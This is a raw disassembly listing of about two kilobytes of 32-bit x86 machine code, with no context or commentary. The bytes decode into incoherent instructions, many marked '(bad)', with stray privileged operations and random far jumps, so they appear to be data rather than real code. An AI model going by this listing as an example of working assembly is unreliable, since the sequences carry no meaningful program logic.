  435e11:	sub    BYTE PTR [ecx+ebx*8],ah
  435e14:	ficomp DWORD PTR [ebx-0x92bbe10]
  435e1a:	and    al,BYTE PTR [edi-0x54]
  435e1d:	fnstcw WORD PTR [eax]
  435e1f:	(bad)  
  435e20:	stc    
  435e21:	aam    0x82
  435e23:	xor    bh,BYTE PTR [esi+edx*4-0xd9b2b62]
  435e2a:	fwait
  435e2b:	sub    BYTE PTR [edx],0x50
  435e2e:	xchg   BYTE PTR [esi+0x5a6a0e27],ch
  435e34:	aas    
  435e35:	or     cl,BYTE PTR [ebx*1-0x13f0afb7]
  435e3c:	jno    0x435eb6
  435e3e:	sub    eax,0x85fe32bc
  435e43:	jge    0x435e89
  435e45:	int    0x72
  435e47:	rcl    BYTE PTR [esi],0x1d
  435e4a:	or     BYTE PTR [edx],dh
  435e4c:	dec    esi
  435e4d:	cmp    BYTE PTR [edi],0x2d
  435e50:	dec    esp
  435e51:	push   0x43
  435e53:	dec    ebp
  435e54:	dec    ecx
  435e55:	pop    edx
  435e56:	les    esp,FWORD PTR [edx+0x68ab6dc6]
  435e5c:	pop    ebp
  435e5d:	out    0x3,al
  435e5f:	pop    esi
  435e60:	pop    ds
  435e61:	pop    eax
  435e62:	stos   DWORD PTR es:[edi],eax
  435e63:	hlt    
  435e64:	sub    eax,ebx
  435e66:	inc    esi
  435e67:	mov    cs,WORD PTR ds:0xe268d74d
  435e6d:	cmp    al,0x8c
  435e6f:	je     0x435eb1
  435e71:	cli    
  435e72:	adc    al,0x3a
  435e74:	adc    eax,DWORD PTR [ebp-0x5adbfaf3]
  435e7a:	cmp    BYTE PTR [edx+ebx*4+0x6a],cl
  435e7e:	test   DWORD PTR [eax-0x59dc1e6b],eax
  435e84:	(bad)  
  435e85:	mov    ah,0x78
  435e87:	adc    bl,dl
  435e89:	xchg   BYTE PTR [esi],al
  435e8b:	sbb    ah,BYTE PTR [ebx+0x1cb837e6]
  435e91:	mov    ds:0xf4d8688,al
  435e96:	cmp    al,0xb
  435e98:	sub    BYTE PTR [eax-0x29e7a93c],bl
  435e9e:	jbe    0x435f00
  435ea0:	inc    ecx
  435ea1:	sub    BYTE PTR [edx],dh
  435ea3:	push   esp
  435ea4:	xor    al,0xef
  435ea6:	and    eax,DWORD PTR [ebp+0x15]
  435ea9:	add    eax,0xea1d7a87
  435eae:	rol    DWORD PTR [esi+0x11],0x38
  435eb2:	call   0x1df78be5
  435eb7:	sub    dh,BYTE PTR [ecx-0x3]
  435eba:	inc    eax
  435ebb:	push   cs
  435ebc:	xor    al,0xd5
  435ebe:	dec    eax
  435ebf:	jl     0x435e73
  435ec1:	hlt    
  435ec2:	fs mov bl,0x2c
  435ec5:	(bad)  
  435ec6:	loop   0x435e71
  435ec8:	push   ebp
  435ec9:	xor    BYTE PTR [ecx-0x36],ah
  435ecc:	xchg   edx,eax
  435ecd:	fsubr  QWORD PTR [edx-0x17fb0594]
  435ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435ed4:	or     BYTE PTR [edi],al
  435ed6:	sub    al,0xea
  435ed8:	jp     0x435f3b
  435eda:	fist   WORD PTR [eax]
  435edc:	jle    0x435ef8
  435ede:	pusha  
  435edf:	xchg   esi,eax
  435ee0:	jp     0x435ee0
  435ee2:	fiadd  DWORD PTR [ecx]
  435ee4:	test   eax,0xaf1a4b6a
  435ee9:	inc    eax
  435eea:	shl    eax,1
  435eec:	sub    al,0xe8
  435eee:	fwait
  435eef:	mov    al,0xf0
  435ef1:	mov    bl,0xfe
  435ef3:	ins    BYTE PTR es:[edi],dx
  435ef4:	mov    ds:0x72d8c25d,eax
  435ef9:	cmp    al,0x24
  435efb:	mov    al,0x90
  435efd:	lods   al,BYTE PTR ds:[esi]
  435efe:	fs retf 0x47a
  435f02:	jmp    0x435f28
  435f04:	in     eax,dx
  435f05:	mov    fs,WORD PTR [eax-0xc]
  435f08:	push   0x801e12c7
  435f0d:	fs enter 0xc94,0xa0
  435f12:	mov    ch,0x3a
  435f14:	lods   al,BYTE PTR ds:[esi]
  435f15:	retf   0x4468
  435f18:	cmp    BYTE PTR [ebp+edx*2+0x22],dh
  435f1c:	add    ch,bh
  435f1e:	dec    ebp
  435f1f:	sub    eax,esp
  435f21:	nop
  435f22:	push   edx
  435f23:	loop   0x435ed9
  435f25:	mov    eax,DWORD PTR [ecx+edi*8]
  435f28:	ja     0x435ec5
  435f2a:	sbb    BYTE PTR [eax],dl
  435f2c:	jmp    0x2409:0xe46e7c
  435f33:	xchg   ecx,eax
  435f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435f35:	hlt    
  435f36:	ins    BYTE PTR es:[edi],dx
  435f37:	imul   BYTE PTR [eax+0x36]
  435f3a:	mov    eax,0xa79e5221
  435f3f:	popa   
  435f40:	inc    ebp
  435f41:	icebp  
  435f42:	mov    dh,0x5d
  435f44:	call   0x949e:0x1f4f878
  435f4b:	aaa    
  435f4c:	add    BYTE PTR [edi+0x404e8058],dh
  435f52:	rcr    DWORD PTR [esi],cl
  435f54:	cmp    ebx,DWORD PTR [ebp-0x7ac09b52]
  435f5a:	int    0xc4
  435f5c:	mov    ds:0x97ef0e8a,al
  435f61:	pop    esi
  435f62:	pop    esi
  435f63:	add    dl,ch
  435f65:	and    ch,BYTE PTR [eax+0x59]
  435f68:	mov    edx,0xeebabea
  435f6d:	ret    0x64d0
  435f70:	adc    BYTE PTR [esi],bh
  435f72:	or     al,0xfc
  435f74:	add    BYTE PTR [edx-0x5e],ch
  435f77:	add    DWORD PTR [eax],esi
  435f79:	stos   BYTE PTR es:[edi],al
  435f7a:	xchg   BYTE PTR [edx],ah
  435f7c:	jmp    0x9752:0xd2a2e552
  435f83:	sbb    BYTE PTR [esp+ebx*4-0x4],0xf5
  435f88:	lods   al,BYTE PTR ds:[esi]
  435f89:	push   esi
  435f8a:	jo     0x435fb9
  435f8c:	cmp    dh,bh
  435f8e:	xor    BYTE PTR [eax+0x4da84bf4],ch
  435f94:	gs ret 0x58ec
  435f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f99:	dec    ecx
  435f9a:	inc    esi
  435f9b:	adc    ch,BYTE PTR [ebp-0x3f]
  435f9e:	xchg   ebx,eax
  435f9f:	pushf  
  435fa0:	inc    edx
  435fa1:	mov    al,bl
  435fa3:	lods   al,BYTE PTR es:[esi]
  435fa5:	mov    dh,0xed
  435fa7:	xchg   ebx,eax
  435fa8:	shr    BYTE PTR [edi+0x3e],cl
  435fab:	lock ins DWORD PTR es:[edi],dx
  435fad:	test   ch,ch
  435faf:	lods   al,BYTE PTR ds:[esi]
  435fb0:	out    0x83,eax
  435fb2:	loope  0x435f67
  435fb4:	adc    DWORD PTR [ecx+0x32],0xdae66e04
  435fbb:	push   esp
  435fbc:	in     al,0x94
  435fbe:	imul   ebx,DWORD PTR [edx-0xd35ad1a],0x431eadb4
  435fc8:	fmul   DWORD PTR [ebp+esi*1-0x2b]
  435fcc:	es push ebp
  435fce:	jb     0x436036
  435fd0:	sbb    eax,0x544c3e10
  435fd5:	jns    0x43604b
  435fd7:	je     0x435f9a
  435fd9:	sub    ecx,ebp
  435fdb:	dec    edx
  435fdc:	pushf  
  435fdd:	pop    edi
  435fde:	call   0xc5c8:0xb35608f5
  435fe5:	jns    0x436040
  435fe7:	mov    al,ds:0x417a5dcb
  435fec:	jecxz  0x43600f
  435fee:	push   esp
  435fef:	mov    edx,edx
  435ff1:	ds loope 0x436011
  435ff4:	mov    dl,0xbe
  435ff6:	loope  0x435f93
  435ff8:	(bad)  
  435ff9:	lods   al,BYTE PTR ds:[esi]
  435ffa:	push   cs
  435ffb:	jmp    0x43602b
  435ffd:	add    BYTE PTR [eax],ah
  435fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436000:	leave  
  436001:	mov    esi,0x14bebb5a
  436006:	mov    eax,0xd451d667
  43600b:	add    DWORD PTR [esp+ebp*4+0x37],ecx
  43600f:	shl    BYTE PTR [edx+ecx*1+0x122830fd],1
  436016:	or     ch,BYTE PTR es:[ebx+ebp*2-0x312d77fd]
  43601e:	xchg   edx,eax
  43601f:	or     esi,edx
  436021:	mov    edx,0x85610
  436026:	xchg   edi,eax
  436027:	into   
  436028:	push   cs
  436029:	mov    BYTE PTR [ebx+0x1c],al
  43602c:	pop    ebx
  43602d:	adc    DWORD PTR [ebp+0x1e5caa35],eax
  436033:	inc    esi
  436034:	sbb    cl,BYTE PTR [eax+ebx*4-0x15bdd42e]
  43603b:	push   ss
  43603c:	xchg   edx,eax
  43603d:	or     al,0x7d
  43603f:	mov    dl,0xf5
  436041:	mov    esp,0x755a6a16
  436046:	mov    bl,0x2c
  436048:	pop    esp
  436049:	sbb    bh,BYTE PTR [edi]
  43604b:	dec    BYTE PTR [edx]
  43604d:	push   es
  43604e:	push   ss
  43604f:	pop    ss
  436050:	shl    DWORD PTR [edx-0x6b1dbd53],0x54
  436057:	les    esi,FWORD PTR [edi]
  436059:	fwait
  43605a:	inc    eax
  43605b:	jle    0x43601f
  43605d:	stos   BYTE PTR es:[edi],al
  43605e:	test   BYTE PTR [edx+0x2a],al
  436061:	or     dh,dh
  436063:	repnz push eax
  436065:	stos   BYTE PTR es:[edi],al
  436066:	cmp    DWORD PTR [edx-0x7ffe19fe],0xffffff99
  43606d:	rcl    cl,1
  43606f:	jle    0x436092
  436071:	fdiv   st,st(3)
  436073:	js     0x436075
  436075:	mov    dh,0x8e
  436077:	les    edx,FWORD PTR [eax+0x5293f63f]
  43607d:	pop    ebx
  43607e:	push   es
  43607f:	div    BYTE PTR [esi-0x3c]
  436082:	jecxz  0x436020
  436084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436085:	pop    es
  436086:	inc    eax
  436087:	mov    ah,0x2
  436089:	repz neg BYTE PTR [eax+eax*1+0x39]
  43608e:	xchg   ebp,eax
  43608f:	add    al,0x83
  436091:	add    BYTE PTR [edi],bh
  436093:	lfs    edi,FWORD PTR [edi-0x77d30bd2]
  43609a:	pusha  
  43609b:	adc    al,0x6
  43609d:	enter  0x9f3e,0x4
  4360a1:	push   esi
  4360a2:	sub    BYTE PTR [esi+0x6a],cl
  4360a5:	sbb    eax,0x2b328cd5
  4360aa:	push   0x33f65545
  4360af:	and    BYTE PTR [edi-0x3c156d42],al
  4360b5:	xor    al,0x4e
  4360b7:	add    BYTE PTR [edi],ah
  4360b9:	bound  esi,QWORD PTR [eax+0x18cad6be]
  4360bf:	pop    eax
  4360c0:	push   esp
  4360c1:	icebp  
  4360c2:	sub    al,0x28
  4360c4:	add    BYTE PTR [ecx+0x70],ah
  4360c7:	inc    edi
  4360c8:	into   
  4360c9:	jmp    0x608d6245
  4360ce:	loop   0x4360ce
  4360d0:	(bad)  
  4360d1:	out    dx,al
  4360d2:	sbb    bl,dl
  4360d4:	mov    eax,ds:0x2c0f72d5
  4360d9:	push   edx
  4360da:	jo     0x436132
  4360dc:	clc    
  4360dd:	stos   BYTE PTR es:[edi],al
  4360de:	int    0xbb
  4360e0:	pop    esp
  4360e1:	es jle 0x43606a
  4360e4:	dec    edi
  4360e5:	lods   al,BYTE PTR ds:[esi]
  4360e6:	add    ah,ch
  4360e8:	sti    
  4360e9:	fidiv  DWORD PTR [ebp+0x10eeb4d1]
  4360ef:	mov    ds:0x7c8ff0b2,al
  4360f4:	or     ecx,DWORD PTR [ebx+0x12]
  4360f7:	cmp    ebp,DWORD PTR [edx-0xf75c82e]
  4360fd:	sbb    al,0xb2
  4360ff:	inc    ebp
  436100:	pop    edi
  436101:	sbb    dl,0xf1
  436104:	(bad)  
  436105:	fdiv   QWORD PTR [ebx-0x5297d01c]
  43610b:	loope  0x4360c0
  43610d:	or     BYTE PTR ds:0x76f37bf2,0x64
  436114:	leave  
  436115:	es adc al,0xd9
  436118:	daa    
  436119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43611a:	or     al,0xd8
  43611c:	push   0x7a
  43611e:	push   es
  43611f:	xchg   BYTE PTR ds:0xb4ae5505,al
  436125:	repnz fcom DWORD PTR [ecx+0x12]
  436129:	out    dx,eax
  43612a:	mov    BYTE PTR [ebx-0x41],0x0
  43612e:	push   esp
  43612f:	mov    ah,0xed
  436131:	ror    BYTE PTR [edx-0x3c],1
  436134:	es push esi
  436136:	mov    ds:0xd458d77a,eax
  43613b:	pusha  
  43613c:	adc    BYTE PTR [edx],al
  43613e:	xor    bh,BYTE PTR cs:[ecx-0x5ab3d9a2]
  436145:	inc    edx
  436146:	add    DWORD PTR ds:0x914e4df4,edx
  43614c:	adc    al,0x1b
  43614e:	test   eax,0x6c9eeaa5
  436153:	mov    edi,0xd11f50dc
  436158:	cs sbb al,0xb1
  43615b:	retf   0xe8e7
  43615e:	mov    al,ss:0x6bb6b3e1
  436164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436165:	enter  0x253a,0x24
  436169:	mov    esp,0x2a0a343b
  43616e:	js     0x436170
  436170:	xchg   BYTE PTR [edi-0x1ebe3f97],cl
  436176:	sub    DWORD PTR ds:0x9a6ad0e9,esi
  43617c:	push   ecx
  43617d:	cs stos BYTE PTR es:[edi],al
  43617f:	adc    al,0x51
  436181:	pusha  
  436182:	stos   BYTE PTR es:[edi],al
  436183:	fadd   QWORD PTR [eax+0x322b4082]
  436189:	mov    al,0xdc
  43618c:	out    dx,eax
  43618d:	sub    BYTE PTR ds:0x5a864c16,dh
  436193:	scas   al,BYTE PTR es:[edi]
  436194:	mov    ah,BYTE PTR [esp+eax*2]
  436197:	mov    ds:0x1e5212d4,al
  43619c:	sbb    DWORD PTR [edx+0x15],ebp
  43619f:	push   es
  4361a0:	adc    ecx,DWORD PTR [edi+eiz*1-0x60]
  4361a4:	jo     0x436134
  4361a6:	xrelease xchg BYTE PTR [edi],cl
  4361a9:	test   BYTE PTR [esi+0x6f],ch
  4361ac:	gs sub al,0x3f
  4361af:	add    BYTE PTR [ebx+ebp*8+0x6c],ch
  4361b3:	test   al,0xba
  4361b5:	sub    dh,dl
  4361b7:	ror    esp,cl
  4361b9:	inc    esp
  4361ba:	jnp    0x43614c
  4361bc:	push   ecx
  4361bd:	inc    esp
  4361be:	(bad)  
  4361bf:	cmp    ah,BYTE PTR [esi]
  4361c1:	mov    cs,esi
  4361c3:	add    BYTE PTR [edi+eax*4-0x30],ch
  4361c7:	repnz ins BYTE PTR es:[edi],dx
  4361c9:	pop    esi
  4361ca:	push   ebx
  4361cb:	or     bl,BYTE PTR [ebx+0x68d443a]
  4361d1:	push   ds
  4361d2:	ds jmp 0x8c21:0x6c7bd096
  4361da:	pop    es
  4361db:	dec    ecx
  4361dc:	inc    esp
  4361dd:	leave  
  4361de:	cmp    bh,BYTE PTR [ecx+eax*4+0x79]
  4361e2:	inc    edi
  4361e3:	add    edx,ebp
  4361e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4361e6:	add    BYTE PTR [eax],bh
  4361e8:	cmp    eax,0x164e1e
  4361ed:	imul   edx,DWORD PTR [edi],0xffffffca
  4361f0:	sbb    BYTE PTR [eax+0x6b84a430],0x91
  4361f7:	or     eax,DWORD PTR [eax+ecx*8+0x3b76ed8]
  4361fe:	neg    DWORD PTR [eax]
  436200:	push   0xffffff9b
  436202:	jp     0x43621a
  436204:	ret    0x409d
  436207:	sub    DWORD PTR [edx],edi
  436209:	leave  
  43620a:	rol    DWORD PTR [edi-0x26],cl
  43620d:	jo     0x43627b
  43620f:	arpl   WORD PTR [ecx-0x2c],di
  436212:	mov    ds:0xe80baa64,al
  436217:	mov    ds:0xaae9acd1,eax
  43621c:	adc    esp,DWORD PTR [edi-0x48]
  43621f:	mov    al,ds:0x453ac850
  436224:	cmp    BYTE PTR [edx+0x55],bl
  436227:	and    al,dh
  436229:	mov    ds:0xa491b034,al
  43622e:	lar    edx,si
  436231:	cdq    
  436232:	sbb    eax,0x27526674
  436237:	loop   0x4362b1
  436239:	jnp    0x43624b
  43623b:	pop    edx
  43623c:	and    eax,0xd2803529
  436241:	mov    al,dh
  436243:	push   ebx
  436244:	pop    edx
  436245:	mov    DWORD PTR [eax+0x1e],0x109c4d56
  43624c:	data16 add BYTE PTR [eax+0x6],ah
  436250:	push   ss
  436251:	mov    eax,0x174dd026
  436256:	xchg   esp,eax
  436257:	mov    dh,0xea
  436259:	inc    BYTE PTR cs:[esi+0x4e]
  43625d:	popf   
  43625e:	mov    bl,ah
  436260:	outs   dx,BYTE PTR ds:[esi]
  436261:	test   eax,0x9ec80de2
  436266:	rol    BYTE PTR [eax],0xe5
  436269:	inc    esi
  43626a:	push   esi
  43626b:	pop    edx
  43626c:	inc    bx
  43626e:	imul   esi,DWORD PTR [eax+0x4cb09419],0xfffffffa
  436275:	and    al,0x56
  436277:	gs int 0x11
  43627a:	add    bl,bh
  43627c:	lods   eax,DWORD PTR ds:[esi]
  43627d:	(bad)
  436280:	retf   0x828
  436283:	std    
  436284:	xor    bh,BYTE PTR [edx-0x99bfea6]
  43628a:	inc    esp
  43628b:	(bad)  
  43628c:	mov    al,ds:0xd854e2f6
  436291:	jbe    0x4362fb
  436293:	dec    edx
  436294:	cmp    BYTE PTR [eax-0x65f56a2d],cl
  43629a:	add    eax,0x16c83405
  43629f:	in     al,0xbc
  4362a1:	dec    esp
  4362a2:	pop    esi
  4362a3:	sbb    al,bh
  4362a5:	mov    cl,0xe2
  4362a7:	add    DWORD PTR [edi],ebx
  4362a9:	push   0x5a300d23
  4362ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4362af:	mov    ds:0xbc083ed0,eax
  4362b4:	push   ss
  4362b5:	loop   0x43628b
  4362b7:	ret    
  4362b8:	push   ss
  4362b9:	push   eax
  4362ba:	cmp    BYTE PTR [eax],bh
  4362bc:	push   ebx
  4362bd:	stos   DWORD PTR es:[edi],eax
  4362be:	mov    edx,0xde528caf
  4362c3:	(bad)  
  4362c4:	sub    eax,0x566d326c
  4362c9:	pop    esi
  4362ca:	or     edi,edx
  4362cc:	xchg   esp,eax
  4362cd:	cmp    ebp,eax
  4362cf:	or     dl,BYTE PTR [edx-0x49]
  4362d2:	lock call 0x7452:0xad08e239
  4362da:	loop   0x43632e
  4362dc:	(bad)  
  4362dd:	dec    edx
  4362de:	les    esp,FWORD PTR [edx+ebx*2-0x3a]
  4362e2:	push   es
  4362e3:	add    DWORD PTR [ebx-0x7141bb42],ecx
  4362e9:	sbb    dh,dl
  4362eb:	dec    edx
  4362ec:	sub    eax,0xdeec1912
  4362f1:	and    BYTE PTR [edx],bh
  4362f3:	mov    esi,0x1ab608ec
  4362f8:	add    al,0x82
  4362fa:	mov    ds:0x5ea2a855,eax
  4362ff:	lods   eax,DWORD PTR ds:[esi]
  436300:	and    al,0xa6
  436302:	add    dl,BYTE PTR [ebp-0x2fb7c5dc]
  436308:	jl     0x43631c
  43630a:	add    al,0x50
  43630c:	test   BYTE PTR [ebx],ch
  43630e:	cli    
  43630f:	mov    edx,0xbf686a24
  436314:	or     ebp,edi
  436316:	cs or  al,0xfa
  436319:	in     al,0xbe
  43631b:	call   0xa0640408
  436320:	rcl    cl,1
  436322:	into   
  436323:	pop    eax
  436324:	add    eax,0x3eaaad30
  436329:	sbb    eax,0xca8707d2
  43632e:	inc    eax
  43632f:	jle    0x436340
  436331:	stos   DWORD PTR es:[edi],eax
  436332:	shr    BYTE PTR [edx+0x4],0x6b
  436336:	xor    al,0xae
  436338:	sub    BYTE PTR [edi+0x2],cl
  43633b:	or     bl,dl
  43633d:	lds    esi,FWORD PTR [esi+0x70]
  436340:	(bad)  
  436341:	shl    BYTE PTR [ecx-0x10],0xe6
  436345:	add    bl,ch
  436347:	adc    eax,DWORD PTR [ecx-0x1331c14c]
  43634d:	or     ch,BYTE PTR [ebx]
  43634f:	add    al,0xf8
  436351:	or     ah,ah
  436353:	jle    0x436313
  436355:	lods   al,BYTE PTR ds:[esi]
  436356:	enter  0xe926,0x98
  43635a:	rol    BYTE PTR [edi+0x72],0x8f
  43635e:	and    ch,BYTE PTR [edx+0x69]
  436361:	mov    dh,dl
  436363:	ins    BYTE PTR es:[edi],dx
  436364:	stos   BYTE PTR es:[edi],al
  436365:	cmp    bl,BYTE PTR [ebp+0x741c98ec]
  43636b:	aam    0x67
  43636d:	push   edx
  43636e:	mov    edi,0x9052bd32
  436373:	data16 test BYTE PTR [di-0x761f],dh
  436379:	cmp    BYTE PTR [ecx-0x7d9930bc],ah
  43637f:	push   cs
  436380:	dec    ebp
  436381:	mov    esp,0x50964bca
  436386:	test   eax,0x14ae8238
  43638b:	fiadd  DWORD PTR [edx+ebx*2+0x6321850c]
  436392:	imul   ebp,DWORD PTR [esi+ebx*4-0x5],0x84011064
  43639a:	xlat   BYTE PTR ds:[ebx]
  43639b:	pop    eax
  43639c:	cld    
  43639d:	div    ch
  43639f:	xchg   dh,dl
  4363a1:	sbb    BYTE PTR [esi],ah
  4363a3:	inc    ebx
  4363a4:	or     cl,BYTE PTR [ebp+0x127e4ed2]
  4363aa:	push   ss
  4363ab:	(bad)  
  4363ac:	and    BYTE PTR [edx-0x14c79457],cl
  4363b2:	inc    eax
  4363b3:	mov    esp,0x1d156a4b
  4363b8:	(bad)  
  4363ba:	fs pop esp
  4363bc:	mov    dl,0x1b
  4363be:	add    BYTE PTR [edi],ch
  4363c0:	and    al,0x34
  4363c2:	stos   BYTE PTR es:[edi],al
  4363c3:	or     dh,BYTE PTR [esi-0xed80184]
  4363c9:	les    ecx,FWORD PTR [ebx+0x44]
  4363cc:	fucom  st(6)
  4363ce:	add    dh,BYTE PTR [eax+0x15]
  4363d1:	ret    0x695a
  4363d4:	xchg   edi,eax
  4363d5:	cmp    DWORD PTR [eax+0x72],0xb9b584e9
  4363dc:	add    al,0xde
  4363de:	rcl    ch,1
  4363e0:	mov    eax,0x3d854743
  4363e5:	dec    eax
  4363e6:	cld    
  4363e7:	test   ah,dh
  4363e9:	loop   0x4363a6
  4363eb:	rcl    BYTE PTR [esp+eax*2+0x47612f89],0x16
  4363f3:	jle    0x4363e4
  4363f5:	lock js 0x4363af
  4363f8:	sbb    ch,BYTE PTR es:[eax-0x57]
  4363fc:	mov    al,ds:0x21e28d26
  436401:	mov    DWORD PTR [edi],ecx
  436403:	(bad)  
  436404:	xchg   ecx,eax
  436405:	std    
  436406:	scas   al,BYTE PTR es:[edi]
  436407:	jne    0x436430
  436409:	push   eax
  43640a:	push   eax
  43640b:	icebp  
  43640c:	and    DWORD PTR [edx],edx
  43640e:	mov    ch,0x10
  436410:	cmp    eax,0x403ee3ea
  436415:	pop    edx
  436416:	sar    DWORD PTR [edx-0x5e],1
  436419:	mov    es,WORD PTR [ecx]
  43641b:	mov    bh,0x30
  43641d:	xor    DWORD PTR [ecx+eax*8+0x4b],ebx
  436421:	call   0x7add14d9
  436426:	inc    edx
  436427:	xor    bh,BYTE PTR [ebp-0x6a]
  43642a:	push   edx
  43642b:	mov    al,0xb6
  43642d:	push   ebx
  43642e:	rol    ch,0x7e
  436431:	pop    ecx
  436432:	loop   0x4364a0
  436434:	xor    al,0x8e
  436436:	mov    al,BYTE PTR [edi]
  436438:	mov    ds:0x25be8cba,eax
  43643d:	retf   0x48a1
  436440:	push   cs
  436441:	lds    ecx,FWORD PTR [ecx-0x7f524540]
  436447:	outs   dx,BYTE PTR ds:[esi]
  436448:	test   al,0x56
  43644a:	ret    
  43644b:	mov    cl,0xa1
  43644d:	jle    0x4363f3
  43644f:	pop    ds
  436450:	xchg   BYTE PTR [edx-0x2c],dl
  436453:	sbb    cl,BYTE PTR [eax+eiz*1-0x6a]
  436457:	add    ah,dl
  436459:	je     0x4364a4
  43645b:	(bad)  
  43645c:	sti    
  43645d:	syscall 
  43645f:	cmp    al,0x90
  436461:	(bad)  
  436462:	retf   0xe488
  436465:	sub    esp,DWORD PTR [esi+0x100bb6d4]
  43646b:	ret    0x94a9
  43646e:	ret    0xac2
  436471:	jl     0x436474
  436473:	stos   DWORD PTR es:[edi],eax
  436474:	cmp    eax,0x611e6ab6
  436479:	jo     0x436483
  43647b:	xchg   ebx,eax
  43647c:	mov    eax,ds:0xdf3ef496
  436481:	or     ah,ah
  436483:	loop   0x4364a6
  436485:	mov    dh,0x2
  436487:	int3   
  436488:	daa    
  436489:	xchg   esp,eax
  43648a:	iret   
  43648b:	out    0x44,eax
  43648d:	adc    al,dl
  43648f:	sbb    cl,BYTE PTR [edi+ecx*4]
  436492:	popa   
  436493:	xor    al,0xb4
  436495:	cld    
  436496:	cmp    BYTE PTR [eax],ah
  436498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436499:	aam    0x76
  43649b:	xor    al,0xdb
  43649d:	xor    al,0x75
  43649f:	adc    BYTE PTR [eax+0x76],bl
  4364a2:	xor    eax,0x5e17f5fc
  4364a7:	ss (bad) 
  4364a9:	daa    
  4364aa:	jmp    0xa2a8:0x59d120a5
  4364b1:	dec    esi
  4364b2:	lods   eax,DWORD PTR ds:[esi]
  4364b3:	mov    al,ds:0xf6f002e3
  4364b8:	in     al,0x91
  4364ba:	js     0x4364f7
  4364bc:	push   ss
  4364bd:	in     eax,0x69
  4364bf:	jecxz  0x436472
  4364c1:	test   BYTE PTR [edx+eiz*8+0x5e],dh
  4364c5:	or     ah,BYTE PTR [edx+0x387ac3f1]
  4364cb:	fsub   QWORD PTR [eax-0xc]
  4364ce:	jecxz  0x43650b
  4364d0:	outs   dx,DWORD PTR ds:[esi]
  4364d1:	push   0x16fe7120
  4364d6:	push   ss
  4364d7:	in     al,dx
  4364d8:	popf   
  4364d9:	jbe    0x4364db
  4364db:	mov    gs,WORD PTR [ebx-0x69cbebeb]
  4364e1:	and    al,0xbd
  4364e3:	js     0x43650e
  4364e5:	ror    BYTE PTR [edx+0x62a10384],1
  4364eb:	jl     0x4364bb
  4364ed:	clc    
  4364ee:	bound  eax,QWORD PTR [ebx-0x3fe15a9f]
  4364f4:	xchg   BYTE PTR [eax],bh
  4364f6:	sahf   
  4364f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4364f8:	inc    edi
  4364f9:	add    bl,bl
  4364fb:	lock add eax,0x93e66536
  436501:	ucomiss xmm0,DWORD PTR [ebx+ebx*2+0x4ad20e81]
  436509:	aad    0x56
  43650b:	dec    eax
  43650c:	rcl    BYTE PTR [edx+0x36],0xb3
  436510:	fwait
  436511:	(bad)  
  436512:	das    
  436513:	dec    ecx
  436514:	enter  0xc087,0xb2
  436518:	mov    cl,0xa2
  43651a:	jmp    0xdf07f88f
  43651f:	jbe    0x436576
  436521:	popf   
  436522:	add    bh,BYTE PTR [edi]
  436524:	add    DWORD PTR [ebp+0x76],edi
  436527:	pop    ecx
  436528:	in     al,dx
  436529:	test   al,0x12
  43652b:	mov    eax,0x63a95497
  436530:	cli    
  436531:	adc    dh,bh
  436533:	arpl   WORD PTR [edx-0x5],di
  436536:	add    eax,0xe0d2d763
  43653b:	dec    edi
  43653c:	and    eax,0x101e64e6
  436541:	ins    DWORD PTR es:[edi],dx
  436542:	cmp    esp,DWORD PTR [esi+esi*1]
  436545:	(bad)  
  436546:	loopne 0x4364e0
  436548:	pop    eax
  436549:	xchg   ebp,eax
  43654a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43654b:	inc    esp
  43654c:	xor    BYTE PTR [eax-0xc],dh
  43654f:	lods   eax,DWORD PTR ds:[esi]
  436550:	ror    BYTE PTR [ecx],0x10
  436553:	hlt    
  436554:	fiadd  WORD PTR [esp+ebx*1]
  436557:	mov    DWORD PTR [esi+0x2],ecx
  43655a:	sub    edx,DWORD PTR [ecx]
  43655c:	xor    BYTE PTR [esi-0x76e7ebf7],dh
  436562:	popa   
  436563:	cld    
  436564:	ins    BYTE PTR es:[edi],dx
  436565:	sbb    al,0x89
  436567:	(bad)  
  436568:	push   ss
  436569:	sub    bl,BYTE PTR [edx+0x21]
  43656c:	aam    0x5d
  43656e:	xchg   BYTE PTR [ecx-0x2b],al
  436571:	(bad)  
  436572:	and    eax,0x67aeb904
  436577:	loop   0x436593
  436579:	aam    0xb
  43657b:	fcmovb st,st(1)
  43657d:	xchg   edx,esp
  43657f:	add    dl,ch
  436581:	adc    esp,DWORD PTR [ecx+0x22f83646]
  436587:	int    0xf1
  436589:	(bad)  
  43658a:	data16 jg 0x4365d9
  43658d:	inc    eax
  43658e:	jle    0x4365c2
  436590:	add    BYTE PTR [edx],bl
  436592:	push   edi
  436593:	jl     0x4365f9
  436595:	(bad)  
  436596:	in     eax,0xb7
  436598:	mov    al,ds:0xfba08af6
  43659d:	fcmovbe st,st(6)
  43659f:	enter  0xd65e,0x9a
  4365a3:	(bad)
  4365a8:	int3   
  4365a9:	xchg   esp,eax
  4365aa:	cmp    bl,al
  4365ac:	rcr    DWORD PTR cs:[esi-0x51],0x6c
  4365b1:	jl     0x436577
  4365b3:	mov    ch,0x40
  4365b5:	add    al,0xe2
  4365b7:	xor    BYTE PTR [ebp+ecx*2+0xde6035d],al
  4365be:	add    eax,0x98146c12
  4365c3:	add    BYTE PTR [esi+eax*8-0x29],al
  4365c7:	jp     0x4365cd
  4365c9:	adc    eax,0xa784b6b6
  4365ce:	mov    dh,0x52
  4365d0:	adc    bh,BYTE PTR [edx+0x1881c4d]
  4365d6:	dec    dl
  4365d8:	add    esi,DWORD PTR [esp+ebx*4]
  4365db:	push   ss
  4365dc:	sbb    ch,ah
  4365de:	hlt    
  4365df:	pop    edx
  4365e0:	inc    edx
  4365e1:	sbb    eax,0x52bea8c0
  4365e6:	ss jg  0x43657d
  4365e9:	pusha  
  4365ea:	adc    ebx,DWORD PTR [edx]
  4365ec:	mov    ds:0x2ea256e0,al
